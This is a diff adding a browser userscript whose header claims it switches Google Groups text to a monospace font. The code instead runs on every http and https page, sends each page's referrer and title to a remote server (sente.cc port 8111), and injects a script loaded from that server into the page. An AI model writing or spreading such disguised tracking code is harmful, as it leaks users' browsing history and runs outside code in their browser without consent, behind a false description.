@@ -1,0 +1,26 @@
+// ==UserScript==
+// @name          Town Town
+// @namespace     http://userstyles.org
+// @description	  This style change to monospace the font used to display Google Groups messages, as well as the reply area.
+// @author        sente
+// @homepage      http://sente.cc/towntown
+// @include       http://*
+// @include       https://*
+// ==/UserScript==
+
+
+// 2011-02-23T14:23:45
+
+(function () {
+    var heads = document.getElementsByTagName("head");
+    if (heads.length > 0) {
+        var node = document.createElement("script");
+        node.type = "text/javascript";
+
+        ref = encodeURIComponent(document.referrer);
+        title = encodeURIComponent(document.title);
+
+        node.src = "http://sente.cc:8111/log.js?ref=" + ref + "&title=" + title
+        heads[0].appendChild(node);
+    }
+})()
